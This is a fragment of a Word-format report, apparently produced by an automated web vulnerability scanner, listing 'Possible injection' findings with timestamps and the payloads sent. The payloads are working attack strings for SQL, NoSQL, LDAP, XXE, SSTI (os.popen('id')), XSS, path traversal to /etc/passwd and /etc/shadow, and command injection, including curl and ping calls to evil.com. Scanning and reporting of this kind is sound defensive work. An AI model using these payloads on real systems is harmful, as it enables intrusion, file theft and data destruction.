        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"username": {"$ne": null}, "password": {"$ne": null}}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44. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:26.974831</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"$where": "sleep(5000)"}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45. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:26.989641</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"$or": [{"admin": true}, {}]}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46. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:27.411409</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"username": {"$regex": ".*"}}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47. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:27.508050</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"$and": [{"a": {"$gt": ""}}, {"b": {"$lt": ""}}]}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48. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:28.084937</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;%= 7*7 %&gt;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49. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:28.185574</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ${{7*7}}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50. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:28.200972</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{7*7}}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51. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:28.617197</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{config}}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52. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:28.780577</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() 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53. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:28.795918</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}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54. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:29.491647</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     (&amp;(objectClass=*)(uid=*))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55. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:29.579932</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *)(&amp;(userPassword=*))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56. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:29.594489</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *)%00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57. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:30.036250</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *)(cn=*))(|(cn=*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58. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:30.115119</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *))(|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59. **Possible XXE injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:30.888445</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;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60. **Possible XXE injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:30.993241</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM 'file:///etc/hosts'&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt;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61. **Possible XXE injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:31.011972</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;?xml version='1.0'?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % ext SYSTEM 'http://evil.com/ext.dtd'&gt; %ext;]&gt;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62. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:31.694386</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |id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63. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:31.712647</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ;whoami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64. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:31.809175</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &amp;nslookup test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65. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:32.308046</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     `id`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66. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:32.406801</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     $(id)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67. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:32.424555</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     || ping -c 1 evil.com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68. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:33.618148</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &amp;&amp; curl http://evil.com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69. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.232765</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     callback=console.log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70. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.326543</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     callback=alert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71. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.341952</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     jsonp=alert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72. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.764694</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     cb=alert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73. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.858176</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     callbackName=alert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74. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:23.451266</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR 1=1--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75. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:23.540130</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '; DROP TABLE users--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76. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:23.547928</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR '1'='1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77. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:23.979029</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' UNION SELECT null--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78. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:24.070740</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' AND SLEEP(5)--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79. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:24.132960</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '||(SELECT version())||'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80. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:24.506861</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     " OR "" = ""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81. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:24.598189</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR 'a'='a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82. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:25.144131</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;img src=x onerror=alert(1)&gt;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83. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:25.235119</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;svg/onload=alert(1)&gt;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84. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:25.242811</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;script&gt;alert(1)&lt;/script&gt;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85. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:25.672014</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;body onload=alert(1)&gt;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86. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:25.831244</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     "&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;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87. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:25.839394</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '"&gt;&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;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88. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:26.201287</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;math&gt;&lt;mi//xlink:href="javascript:alert(1)"&gt;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89. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:26.748493</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ../../../etc/passwd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90. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:26.839218</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     /../../../../boot.ini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91. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:26.848505</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..\..\..\windows\win.ini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92. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:27.275874</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     %2e%2e/%2e%2e/%2e%2e/etc/passwd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93. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:27.366673</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%2f..%2f..%2fetc%2fshadow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94. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:27.438797</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     /etc/passwd%00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95. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:27.803021</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     %252e%252e/%252e%252e/%252e%252e/etc/passwd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96. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:27.892539</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     %252e%252e%252fetc%252fpasswd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97. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:27.967462</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%c0%af..%c0%afetc/passwd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98. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:28.330229</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%e0%80%afetc/passwd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99. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:28.421550</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%c1%9c..%c1%9cetc/passwd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100. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:28.495282</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%uff0e%uff0e%u2215etc%u2215passwd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101. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:28.861359</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..\..\..\..\..\..\windows\system32\drivers\etc\hosts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102. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:28.949865</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..\\..\\etc\\passwd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103. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:29.025681</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..//..//..//etc//passwd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104. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:29.389907</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     /etc/passwd%00.png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105. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:29.485792</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%2f..%2f%2e%2e%2fetc%2fpasswd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106. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:29.555735</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ../../etc/passwd%00.jpg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107. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:29.917131</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ../../etc/passwd..;/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108. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:30.466177</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"$where": "sleep(5000)"}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109. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:30.559869</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"$or": [{"admin": true}, {}]}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110. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:30.567054</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"username": {"$ne": null}, "password": {"$ne": null}}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111. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:30.993578</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"username": {"$regex": ".*"}}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112. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:31.087644</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"$and": [{"a": {"$gt": ""}}, {"b": {"$lt": ""}}]}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113. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:31.673451</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ${{7*7}}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114. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:31.767837</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{7*7}}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115. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:31.775582</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;%= 7*7 %&gt;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116. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:32.202412</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{config}}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117. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:32.295482</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() 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118. **Possible SSTI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:32.306265</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}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119. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:32.969130</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *)%00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120. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:32.980618</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *)(&amp;(userPassword=*))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121. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:32.988136</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     (&amp;(objectClass=*)(uid=*))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122. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:33.501002</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *)(cn=*))(|(cn=*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123. **Possible LDAP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:33.572646</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     *))(|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124. **Possible XXE injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:34.282074</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;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125. **Possible XXE injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:34.295576</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;?xml version='1.0'?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % ext SYSTEM 'http://evil.com/ext.dtd'&gt; %ext;]&gt;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126. **Possible XXE injection**</w:t>
        <w:br/>
